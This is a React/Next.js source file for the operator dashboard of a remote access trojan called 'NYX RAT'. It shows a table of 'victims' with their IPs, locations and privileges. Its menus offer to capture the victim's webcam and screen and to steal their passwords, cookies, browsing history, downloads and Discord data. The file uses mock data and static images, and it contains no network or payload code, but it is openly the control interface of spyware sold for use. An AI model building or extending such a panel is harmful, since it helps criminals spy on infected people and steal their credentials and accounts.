"use client";
import { useState, useEffect, useRef, MouseEvent } from "react";
import Image from "next/image";
import { Menu, X } from "lucide-react";
import logo from "@/assets/logo.png";
import prtsc from "@/assets/screenshot.png";
import webcam from "@/assets/webcam.png";
import { HereBackgroundGradientAnimation } from "./ui/background-gradient-animation";
import Data from "@/data/teste.json";
import { useRouter } from "next/navigation";
import Footer from "./footer/footer";
import ModalDiscord from "@/components/Modals/discord/modaldiscord";
import ModalDownloads from "@/components/Modals/downloads/modaldownloads";
import ModalHistory from "@/components/Modals/history/ModalHistory";
import ModalCookies from "@/components/Modals/cookies/modalcookies";
import ModalPassowrds from "@/components/Modals/senhas/modalsenhas";
interface User {
  id: number;
  ip: string;
  name: string;
  username: string;
  hostname: string;
  version: string;
  location: string;
  os: string;
  privileges: string;
  currentWindow: string;
  hasWebcam: boolean;
  system: string;
  architecture: string;
  cpu: string;
  gpu: string;
  ram: string;
  hwid: string;
  country: string;
  region: string;
  city: string;
  cep: string;
  isp: string;
}

interface networkDetails {
  macAdress: string;
  subnetMask: string;
  gateway: string;
  dns: string;
}

interface ContextMenuState {
  visible: boolean;
  x: number;
  y: number;
  userId: number | null;
}

interface SubMenuState {
  visible: boolean;
  x: number;
  y: number;
}

export default function Component() {
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [contextMenu, setContextMenu] = useState<ContextMenuState>({
    visible: false,
    x: 0,
    y: 0,
    userId: null,
  });
  const [subMenu, setSubMenu] = useState<SubMenuState>({
    visible: false,
    x: 0,
    y: 0,
  });
  const contextMenuRef = useRef<HTMLDivElement>(null);
  const subMenuRef = useRef<HTMLDivElement>(null);
  const [selectedUserId, setSelectedUserId] = useState<number | null>(null);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [isWebcamModalOpen, setIsWebcamModalOpen] = useState(false);
  const [isScreenshotModalOpen, setIsScreenshotModalOpen] = useState(false);
  const [webcamImage, setWebcamImage] = useState<string | null>(null);
  const [screenshotImage, setScreenshotImage] = useState<string | null>(null);
  const users: User[] = Data;

  const userInfo = {
    name: "Faccin",
    registeredDate: "2024-01-15",
    expiryDate: "2038-01-15",
  };
  const rota = useRouter();

  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (
        contextMenuRef.current &&
        !contextMenuRef.current.contains(event.target as Node)
      ) {
        setContextMenu({ visible: false, x: 0, y: 0, userId: null });
      }
      if (
        subMenuRef.current &&
        !subMenuRef.current.contains(event.target as Node)
      ) {
        setSubMenu({ visible: false, x: 0, y: 0 });
      }
    };

    document.addEventListener(
      "mousedown",
      handleClickOutside as unknown as EventListener
    );
    return () => {
      document.removeEventListener(
        "mousedown",
        handleClickOutside as unknown as EventListener
      );
    };
  }, []);

  const handleContextMenu = (e: React.MouseEvent, userId: number) => {
    e.preventDefault();
    setContextMenu({ visible: true, x: e.clientX, y: e.clientY, userId });
    setSubMenu({ visible: false, x: 0, y: 0 });
  };

  const handleSubMenuHover = (e: React.MouseEvent<HTMLDivElement>) => {
    const rect = e.currentTarget.getBoundingClientRect();
    setSubMenu({ visible: true, x: rect.right, y: rect.top });
  };

  const handleUserClick = (userId: number) => {
    setSelectedUserId(userId === selectedUserId ? null : userId);
  };

  const handleOpenModal = () => {
    setIsModalOpen(true);
    setContextMenu({ visible: false, x: 0, y: 0, userId: null });
  };

  const handleCloseModal = () => {
    setIsModalOpen(false);
  };

  const handleOpenWebcamModal = () => {
    setIsWebcamModalOpen(true);
    setContextMenu({ visible: false, x: 0, y: 0, userId: null });
    setWebcamImage(webcam.src);
  };

  const handleCloseWebcamModal = () => {
    setIsWebcamModalOpen(false);
    setWebcamImage(null);
  };

  const handleOpenScreenshotModal = () => {
    setIsScreenshotModalOpen(true);
    setContextMenu({ visible: false, x: 0, y: 0, userId: null });
    setScreenshotImage(prtsc.src);
  };

  const handleCloseScreenshotModal = () => {
    setIsScreenshotModalOpen(false);
    setScreenshotImage(null);
  };

  const handleNavegar = (local: string) => {
    rota.push(`/${local}`);
  };

  interface ImageModalProps {
    isOpen: boolean;
    onClose: () => void;
    title: string;
    imageSrc: string | null;
  }

  const Modal = () => {
    const selectedUser = users.find((user) => user.id === selectedUserId);

    return (
      <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center z-50">
        <div className="bg-zinc-800 p-6 rounded-md text-white w-10/12 max-w-4xl h-4/5 overflow-y-auto space-y-6">
          <div className="absolute inset-0 flex items-center justify-center opacity-5 pointer-events-none">
            <Image src={logo} alt="Nyx Logo" width={700} height={700} />
          </div>
          {/* Botão de fechar */}

          <button
            onClick={handleCloseModal}
            className=" self-start text-red-700"
          >
            CLOSE
          </button>
          <h2 className="text-3xl font-bold text-center">
            Victim informations
          </h2>
          <div className="grid grid-cols-2 gap-4">
            <div className="bg-zinc-900 p-4 rounded-md">
              <strong>Display Name:</strong>
              <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">
                {selectedUser?.name || "N/A"}
              </p>
            </div>
            <div className="bg-zinc-900 p-4 rounded-md">
              <strong>Hostname:</strong>
              <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">
                {selectedUser?.hostname || "N/A"}
              </p>
            </div>
            <div className="bg-zinc-900 p-4 rounded-md">
              <strong>Username:</strong>
              <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">
                {selectedUser?.username || "N/A"}
              </p>
            </div>
          </div>

          <h2 className="text-3xl font-bold text-center mt-8">
            System Informations
          </h2>
          <div className="grid grid-cols-2 gap-4">
            <div className="bg-zinc-900 p-4 rounded-md">
              <strong>System:</strong>
              <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">
                {selectedUser?.os || "N/A"}
              </p>
            </div>
            <div className="bg-zinc-900 p-4 rounded-md">
              <strong>Version:</strong>
              <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">
                {selectedUser?.version || "N/A"}
              </p>
            </div>
            <div className="bg-zinc-900 p-4 rounded-md">
              <strong>Architecture:</strong>
              <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">
                {selectedUser?.architecture || "N/A"}
              </p>
            </div>
          </div>

          <h2 className="text-3xl font-bold text-center mt-8">
            About the System
          </h2>
          <div className="grid grid-cols-2 gap-4">
            <div className="bg-zinc-900 p-4 rounded-md">
              <strong>CPU:</strong>
              <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">
                {selectedUser?.cpu || "N/A"}
              </p>
            </div>
            <div className="bg-zinc-900 p-4 rounded-md">
              <strong>GPU:</strong>
              <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">
                {selectedUser?.gpu || "N/A"}
              </p>
            </div>
            <div className="bg-zinc-900 p-4 rounded-md">
              <strong>RAM:</strong>
              <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">
                {selectedUser?.ram || "N/A"}
              </p>
            </div>
            <div className="bg-zinc-900 p-4 rounded-md">
              <strong>HWID:</strong>
              <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">
                {selectedUser?.hwid || "N/A"}
              </p>
            </div>
          </div>

          <h2 className="text-3xl font-bold text-center mt-8">
            Internet Informations
          </h2>
          <div className="grid grid-cols-2 gap-4">
            <div className="bg-zinc-900 p-4 rounded-md">
              <strong>IP:</strong>
              <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">
                {selectedUser?.ip || "N/A"}
              </p>
            </div>
            <div className="bg-zinc-900 p-4 rounded-md">
              <strong>MAC:</strong>
              <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">
                fc:f0:c3:0f:3c:f0
              </p>
            </div>

            <div className="bg-zinc-900 p-4 rounded-md">
              <strong>Country:</strong>
              <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">
                {selectedUser?.country || "N/A"}
              </p>
            </div>
            <div className="bg-zinc-900 p-4 rounded-md">
              <strong>Region:</strong>
              <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">
                {selectedUser?.region || "N/A"}
              </p>
            </div>
            <div className="bg-zinc-900 p-4 rounded-md">
              <strong>City:</strong>
              <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">
                {selectedUser?.city || "N/A"}
              </p>
            </div>
            <div className="bg-zinc-900 p-4 rounded-md">
              <strong>CEP:</strong>
              <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">
                {selectedUser?.cep || "N/A"}
              </p>
            </div>
            <div className="bg-zinc-900 p-4 rounded-md">
              <strong>ISP:</strong>
              <p className="mt-1 text-sm bg-zinc-700 p-2 rounded-md">
                {selectedUser?.isp || "N/A"}
              </p>
            </div>
          </div>
        </div>
      </div>
    );
  };

  const ImageModal: React.FC<ImageModalProps> = ({
    isOpen,
    onClose,
    title,
    imageSrc,
  }) => {
    if (!isOpen || !imageSrc) return null;

    return (
      <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center z-50">
        <div className="bg-zinc-800 p-6 rounded-md text-white w-10/12 max-w-4xl h-4/5 overflow-y-auto flex flex-col items-center relative">
          <div className="absolute inset-0 flex items-center justify-center opacity-[2%] pointer-events-none">
            <Image src={logo} alt="Nyx Logo" width={700} height={700} />
          </div>
          <button onClick={onClose} className="self-start text-red-700">
            CLOSE
          </button>
          <h2 className="text-3xl font-bold text-center mb-4">{title}</h2>
          <div className="flex-grow flex items-center justify-center">
            <img src={imageSrc} alt={title} className="max-w-full max-h-full" />
          </div>
        </div>
      </div>
    );
  };

  function ContextMenu() {
    const [isModalOpenSenha, setIsModalOpenSenha] = useState<boolean>(false);
    const [isCookiesOpen, setIsCookiesOpen] = useState<boolean>(false);
    const [isHistoryOpen, setIsHistoryOpen] = useState<boolean>(false);
    const [isDownloadsOpen, setIsDownloadsOpen] = useState<boolean>(false);
    const [isDiscordOpen, setIsDiscordOpen] = useState<boolean>(false);

    const handleOpenDiscord = () => {
      setIsDiscordOpen(true);
    };
    const handleCloseDiscord = () => {
      setIsDiscordOpen(false);
    };
    const handleOpenDL = () => {
      setIsDownloadsOpen(true);
    };
    const handleCloseDL = () => {
      setIsDownloadsOpen(false);
    };

    const handleOpenHistory = () => {
      setIsHistoryOpen(true);
    };
    const handleCloseHistory = () => {
      setIsHistoryOpen(false);
    };
    const handleOpenCookies = () => {
      setIsCookiesOpen(true);
    };
    const handleCloseCookies = () => {
      setIsCookiesOpen(false);
    };
    const handleOpenModalSenha = () => {
      setIsModalOpenSenha(true);
    };
    const handleCloseModalSenha = () => {
      setIsModalOpenSenha(false);
    };

    return (
      <div
        ref={contextMenuRef}
        className="absolute bg-zinc-800 border border-zinc-700 rounded shadow-lg py-1 z-50"
        style={{ top: `${contextMenu.y}px`, left: `${contextMenu.x}px` }}
      >
        <div
          className="px-4 py-2 hover:bg-zinc-700 cursor-pointer"
          onClick={handleOpenModal}
        >
          <abbr title="Here you can take the victim information">
            GET Victim Information
          </abbr>
        </div>
        <div
          className="px-4 py-2 hover:bg-zinc-700 cursor-pointer"
          onClick={handleOpenWebcamModal}
        >
          <abbr title="Here you can take a picture from the victim">
            GET Webcam pic
          </abbr>
        </div>
        <div
          className="px-4 py-2 hover:bg-zinc-700 cursor-pointer"
          onClick={handleOpenScreenshotModal}
        >
          <abbr title="Here you can take a print from the victim">
            GET Screnn Shot
          </abbr>
        </div>
        <div
          className="px-4 py-2 hover:bg-zinc-700 cursor-pointer relative"
          onMouseEnter={handleSubMenuHover}
        >
          Stealer Options ▶
          {subMenu.visible && (
            <div
              ref={subMenuRef}
              className="absolute bg-zinc-800 border border-zinc-700 rounded shadow-lg py-1"
              style={{ top: "0", left: "100%", minWidth: 250 }}
            >
              <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer">
                <abbr
                  className="no-underline"
                  title="Here you can steal the user Passwords"
                >
                    <p  onClick={handleOpenModalSenha}>Steal Passwords</p>
                </abbr>
              </div>
              <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer">
                <abbr title="Here you can steal the victmin Cookies">
                    <p  onClick={handleOpenCookies}>Steal Cookies</p>
                </abbr>
              </div>
              <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer">
                <abbr title="Here you can steal the victmin History">
                    <p onClick={handleOpenHistory}>Steal History</p>
                </abbr>
              </div>
              <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer">
                <abbr title="Here you can steal the victmin Downloads">
                    <p onClick={handleOpenDL}> Steal Downloads</p>
                </abbr>
              </div>
              <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer">
                <abbr title="Here you can steal the victmin Discord">
                    <p onClick={handleOpenDiscord}>Steal Discord</p>
                </abbr>
              </div>
            </div>
          )}
        </div>
        {/* O onclick para deletar o user vai ficar aqui */}
        <div className="px-4 py-2 hover:bg-zinc-700 text-red-500 cursor-pointer">
          <button>Remove Victim</button>
        </div>
        {isHistoryOpen && <ModalHistory />}
        {isDownloadsOpen && <ModalDownloads />}
        {isDiscordOpen && <ModalDiscord/>}
        {isCookiesOpen && <ModalCookies/>}
        {isModalOpenSenha && <ModalPassowrds />}
      </div>
      
    );
    
  }
  

  return (
    <HereBackgroundGradientAnimation>
      <div className="min-h-screen  text-white flex flex-col relative">
        <div className="absolute inset-0 flex items-center justify-center opacity-5 pointer-events-none">
          <Image src={logo} alt="Nyx Logo" width={700} height={700} />
        </div>

        <header className="p-4 flex justify-between items-center relative z-10">
          <div className="flex items-center space-x-2"></div>
          <h1 className="text-xl sm:text-2xl font-bold">
            <span className="text-zinc-400">NYX</span> RAT
          </h1>
          <button
            onClick={() => setIsMenuOpen(!isMenuOpen)}
            className="p-2 sm:hidden"
          >
            <Menu className="h-6 w-6" />
          </button>
          <div className="hidden sm:flex items-center space-x-2">
            <div className="text-xs">
              <p>{userInfo.name}</p>
              <p>Registered: {userInfo.registeredDate}</p>
              <p>Expiry: {userInfo.expiryDate}</p>
            </div>
          </div>
        </header>

        {/* celular hamburguer */}
        {isMenuOpen && (
          <div className="fixed inset-y-0 right-0 w-64 bg-zinc-800 p-4 z-20 sm:hidden">
            <div className="flex items-center space-x-4 mb-4">
              <div className="w-12 h-12 bg-gray-600 rounded-full"></div>
              <div>
                <p className="font-medium">{userInfo.name}</p>
                <p className="text-sm text-zinc-400">
                  Registered: {userInfo.registeredDate}
                </p>
                <p className="text-sm text-zinc-400">
                  Expiry: {userInfo.expiryDate}
                </p>
              </div>
            </div>
            <button
              onClick={() => setIsMenuOpen(false)}
              className="absolute top-4 right-4 text-white"
            >
              &times;
            </button>
          </div>
        )}

        <main className="flex-grow p-4 flex flex-col items-center relative z-10">
          <div className="w-full overflow-x-auto">
            <table className="w-full mb-8 border-collapse">
              <thead>
                <tr className="bg-zinc-800">
                  <th className="px-2 py-1 sm:px-4 sm:py-2 text-left">IP</th>
                  <th className="px-2 py-1 sm:px-4 sm:py-2 text-left">
                    Client Name
                  </th>
                  <th className="px-2 py-1 sm:px-4 sm:py-2 text-left">
                    Username
                  </th>
                  <th className="px-2 py-1 sm:px-4 sm:py-2 text-left">
                    Version
                  </th>
                  <th className="px-2 py-1 sm:px-4 sm:py-2 text-left">
                    Location
                  </th>
                  <th className="px-2 py-1 sm:px-4 sm:py-2 text-left">OS</th>
                  <th className="px-2 py-1 sm:px-4 sm:py-2 text-left">
                    Privileges
                  </th>
                  <th className="px-2 py-1 sm:px-4 sm:py-2 text-left">
                    Current Window
                  </th>
                  <th className="px-2 py-1 sm:px-4 sm:py-2 text-left">
                    Webcam
                  </th>
                </tr>
              </thead>
              <tbody>
                {users.map((user) => (
                  <tr
                    key={user.id}
                    className={`border-b border-zinc-700 transition-colors duration-200 hover:bg-purple-800 hover:bg-opacity-40 bg-opacity-30`}
                    onClick={() => handleUserClick(user.id)}
                    onContextMenu={(e) => handleContextMenu(e, user.id)}
                  >
                    <td className="px-2 py-1 sm:px-4 sm:py-2 ">{user.ip}</td>
                    <td className="px-2 py-1 sm:px-4 sm:py-2">{user.name}</td>
                    <td className="px-2 py-1 sm:px-4 sm:py-2">
                      {user.username}
                    </td>
                    <td className="px-2 py-1 sm:px-4 sm:py-2">
                      {user.version}
                    </td>
                    <td className="px-2 py-1 sm:px-4 sm:py-2">
                      {user.location}
                    </td>
                    <td className="px-2 py-1 sm:px-4 sm:py-2">{user.os}</td>
                    <td className="px-2 py-1 sm:px-4 sm:py-2">
                      {user.privileges}
                    </td>
                    <td className="px-2 py-1 sm:px-4 sm:py-2">
                      {user.currentWindow}
                    </td>
                    <td className="px-2 py-1 sm:px-4 sm:py-2">
                      {user.hasWebcam ? "Yes" : "No"}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
          <div>
            <button
              onClick={() => handleNavegar("")}
              className="relative w-64 bg-white hover:bg-purple-700 text-black py-2 rounded-md transition-all duration-300 ease-in-out transform hover:scale-105"
            >
              Back to the main
            </button>
          </div>
        </main>
        <Footer />
      </div>

      {contextMenu.visible && <ContextMenu />}
      {isModalOpen && <Modal />}
      {isWebcamModalOpen && (
        <ImageModal
          isOpen={isWebcamModalOpen}
          onClose={handleCloseWebcamModal}
          title="Webcam Image"
          imageSrc={webcamImage}
        />
      )}
      {isScreenshotModalOpen && (
        <ImageModal
          isOpen={isScreenshotModalOpen}
          onClose={handleCloseScreenshotModal}
          title="Screenshot"
          imageSrc={screenshotImage}
        />
      )}
    </HereBackgroundGradientAnimation>
  );
}
